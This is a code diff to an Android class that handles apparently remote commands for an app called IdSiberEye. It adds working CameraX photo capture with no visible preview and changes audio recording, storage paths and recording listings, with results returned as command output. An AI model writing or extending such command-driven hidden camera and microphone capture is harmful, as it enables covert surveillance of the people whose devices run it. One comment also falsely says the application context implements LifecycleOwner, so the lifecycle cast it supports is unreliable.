@@ -5,9 +5,20 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.hardware.Camera;
 import android.media.MediaRecorder;
+import android.os.Build;
 import android.os.Environment;
 import android.util.Log;
 import androidx.core.app.ActivityCompat;
+
+// CameraX imports
+import androidx.camera.core.CameraSelector;
+import androidx.camera.core.ImageCapture;
+import androidx.camera.core.ImageCaptureException;
+import androidx.camera.core.Preview;
+import androidx.camera.lifecycle.ProcessCameraProvider;
+import androidx.camera.view.PreviewView;
+import androidx.lifecycle.LifecycleOwner;
+import com.google.common.util.concurrent.ListenableFuture;
 
 import com.idsiber.eye.CommandResult;
 
@@ -18,6 +29,10 @@ import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
+import android.os.Handler;
+import android.os.Looper;
 
 /**
  * Handler untuk media dan recording (audio, foto, video)
@@ -27,6 +42,7 @@ public class MediaHandler {
     private Context context;
     private MediaRecorder mediaRecorder;
     private Camera camera;
+    private ImageCapture imageCapture;
     private String currentRecordingPath;
     private boolean isRecording = false;
 
@@ -36,20 +52,40 @@ public class MediaHandler {
 
     public CommandResult startAudioRecording(JSONObject params) {
         try {
-            // Check permissions
-            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
-                ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            // Check audio permission (always required)
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                 return new CommandResult(false, "Audio recording permission required", null);
+            }
+            
+            // Check storage permission based on Android version
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Android 10+ uses scoped storage - we use app-specific directory which doesn't require permission
+                // No permission check needed for app-specific directories on Android 10+
+            } else {
+                // Android 9 and below need WRITE_EXTERNAL_STORAGE for legacy storage
+                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                    return new CommandResult(false, "Storage permission required for Android 9 and below", null);
+                }
             }
 
             if (isRecording) {
                 return new CommandResult(false, "Recording already in progress", null);
             }
 
-            // Create output directory
-            File recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
+            // Create output directory - use app-specific directory for better compatibility
+            File recordingsDir;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Use app-specific directory on Android 10+
+                recordingsDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "IdSiberEye");
+            } else {
+                // Use legacy storage on Android 9 and below
+                recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
+            }
+            
             if (!recordingsDir.exists()) {
-                recordingsDir.mkdirs();
+                if (!recordingsDir.mkdirs()) {
+                    return new CommandResult(false, "Failed to create recordings directory", null);
+                }
             }
 
             // Generate filename
@@ -119,16 +155,36 @@ public class MediaHandler {
 
     public CommandResult takePhoto(JSONObject params) {
         try {
-            // Check camera permission
-            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
-                ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            // Check camera permission (always required)
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 return new CommandResult(false, "Camera permission required", null);
             }
+            
+            // Check storage permission based on Android version
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Android 10+ uses scoped storage - we use app-specific directory which doesn't require permission
+                // No permission check needed for app-specific directories on Android 10+
+            } else {
+                // Android 9 and below need WRITE_EXTERNAL_STORAGE for legacy storage
+                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                    return new CommandResult(false, "Storage permission required for Android 9 and below", null);
+                }
+            }
 
-            // Create output directory
-            File photosDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Photos");
+            // Create output directory - use app-specific directory for better compatibility
+            File photosDir;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Use app-specific directory on Android 10+ - no permission needed
+                photosDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES), "IdSiberEye");
+            } else {
+                // Use legacy storage on Android 9 and below
+                photosDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Photos");
+            }
+            
             if (!photosDir.exists()) {
-                photosDir.mkdirs();
+                if (!photosDir.mkdirs()) {
+                    return new CommandResult(false, "Failed to create photos directory", null);
+                }
             }
 
             // Generate filename
@@ -138,28 +194,117 @@ public class MediaHandler {
 
             // Determine camera to use (front or back)
             String cameraType = params.optString("camera", "back");
-            int cameraId = cameraType.equals("front") ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
-
-            // Find camera
-            int numberOfCameras = Camera.getNumberOfCameras();
-            int selectedCameraId = -1;
+            int lensFacing;
             
-            for (int i = 0; i < numberOfCameras; i++) {
-                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
-                Camera.getCameraInfo(i, cameraInfo);
-                if (cameraInfo.facing == cameraId) {
-                    selectedCameraId = i;
-                    break;
+            if (cameraType.equals("front")) {
+                lensFacing = CameraSelector.LENS_FACING_FRONT;
+            } else {
+                lensFacing = CameraSelector.LENS_FACING_BACK;
+            }
+
+            // Use CameraX for modern Android devices
+            try {
+                final File photoFile = new File(photoPath);
+                final CountDownLatch captureLatch = new CountDownLatch(1);
+                final CommandResult[] resultHolder = new CommandResult[1];
+
+                // Run CameraX operations on main thread
+                Handler mainHandler = new Handler(Looper.getMainLooper());
+                mainHandler.post(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            // Create output file options
+                            ImageCapture.OutputFileOptions outputFileOptions = 
+                                new ImageCapture.OutputFileOptions.Builder(photoFile).build();
+
+                            // Setup image capture
+                            imageCapture = new ImageCapture.Builder()
+                                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                                .setJpegQuality(90)
+                                .build();
+
+                            // Get camera provider
+                            ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(context);
+                            cameraProviderFuture.addListener(() -> {
+                                try {
+                                    ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
+
+                                    // Select camera
+                                    CameraSelector cameraSelector = new CameraSelector.Builder()
+                                        .requireLensFacing(lensFacing)
+                                        .build();
+
+                                    // Bind use cases - use application context as LifecycleOwner
+                                    cameraProvider.unbindAll();
+                                    try {
+                                        // Use application context which implements LifecycleOwner
+                                        cameraProvider.bindToLifecycle((androidx.lifecycle.LifecycleOwner) context.getApplicationContext(), cameraSelector, imageCapture);
+                                    } catch (Exception e) {
+                                        Log.e(TAG, "Failed to bind camera to lifecycle: " + e.getMessage());
+                                        resultHolder[0] = new CommandResult(false, "Failed to initialize camera: " + e.getMessage(), null);
+                                        captureLatch.countDown();
+                                        return;
+                                    }
+
+                                    // Take picture
+                                    imageCapture.takePicture(outputFileOptions, 
+                                        context.getMainExecutor(),
+                                        new ImageCapture.OnImageSavedCallback() {
+                                            @Override
+                                            public void onImageSaved(ImageCapture.OutputFileResults outputFileResults) {
+                                                if (photoFile.exists() && photoFile.length() > 0) {
+                                                    try {
+                                                        JSONObject result = new JSONObject();
+                                                        result.put("photo_path", photoPath);
+                                                        result.put("filename", filename);
+                                                        result.put("file_size", photoFile.length());
+                                                        result.put("camera_used", cameraType);
+                                                        
+                                                        resultHolder[0] = new CommandResult(true, "Photo captured successfully", result.toString());
+                                                    } catch (Exception e) {
+                                                        resultHolder[0] = new CommandResult(false, "Error creating result: " + e.getMessage(), null);
+                                                    }
+                                                } else {
+                                                    resultHolder[0] = new CommandResult(false, "Photo file was not created", null);
+                                                }
+                                                captureLatch.countDown();
+                                            }
+
+                                            @Override
+                                            public void onError(ImageCaptureException exception) {
+                                                resultHolder[0] = new CommandResult(false, "Failed to capture photo: " + exception.getMessage(), null);
+                                                captureLatch.countDown();
+                                            }
+                                        });
+
+                                } catch (Exception e) {
+                                    resultHolder[0] = new CommandResult(false, "Failed to initialize camera: " + e.getMessage(), null);
+                                    captureLatch.countDown();
+                                }
+                            }, context.getMainExecutor());
+
+                        } catch (Exception e) {
+                            resultHolder[0] = new CommandResult(false, "Failed to setup camera: " + e.getMessage(), null);
+                            captureLatch.countDown();
+                        }
+                    }
+                });
+
+                // Wait for capture to complete (max 15 seconds)
+                if (!captureLatch.await(15, TimeUnit.SECONDS)) {
+                    return new CommandResult(false, "Photo capture timeout", null);
                 }
-            }
 
-            if (selectedCameraId == -1) {
-                return new CommandResult(false, "Requested camera not available", null);
-            }
+                if (resultHolder[0] != null) {
+                    return resultHolder[0];
+                } else {
+                    return new CommandResult(false, "Photo capture failed", null);
+                }
 
-            // Note: Taking photo requires more complex implementation with Camera2 API or CameraX
-            // This is a simplified version that would need proper camera preview and capture implementation
-            return new CommandResult(false, "Photo capture requires camera preview implementation", null);
+            } catch (Exception e) {
+                return new CommandResult(false, "Failed to take photo with CameraX: " + e.getMessage(), null);
+            }
 
         } catch (Exception e) {
             return new CommandResult(false, "Failed to take photo: " + e.getMessage(), null);
@@ -216,6 +361,7 @@ public class MediaHandler {
             if (isRecording && currentRecordingPath != null) {
                 File recordingFile = new File(currentRecordingPath);
                 status.put("current_file_size", recordingFile.exists() ? recordingFile.length() : 0);
+                status.put("file_exists", recordingFile.exists());
             }
 
             return new CommandResult(true, "Recording status retrieved", status.toString());
@@ -226,7 +372,15 @@ public class MediaHandler {
 
     public CommandResult listRecordings() {
         try {
-            File recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
+            // Determine recordings directory based on Android version
+            File recordingsDir;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Use app-specific directory on Android 10+
+                recordingsDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "IdSiberEye");
+            } else {
+                // Use legacy storage on Android 9 and below
+                recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
+            }
             
             JSONObject result = new JSONObject();
             
@@ -234,6 +388,7 @@ public class MediaHandler {
                 result.put("recordings", new org.json.JSONArray());
                 result.put("total_files", 0);
                 result.put("total_size", 0);
+                result.put("directory_path", recordingsDir.getAbsolutePath());
                 return new CommandResult(true, "No recordings found", result.toString());
             }
 
@@ -260,6 +415,7 @@ public class MediaHandler {
             result.put("recordings", recordings);
             result.put("total_files", recordings.length());
             result.put("total_size", totalSize);
+            result.put("directory_path", recordingsDir.getAbsolutePath());
 
             return new CommandResult(true, "Found " + recordings.length() + " recordings", result.toString());
         } catch (Exception e) {
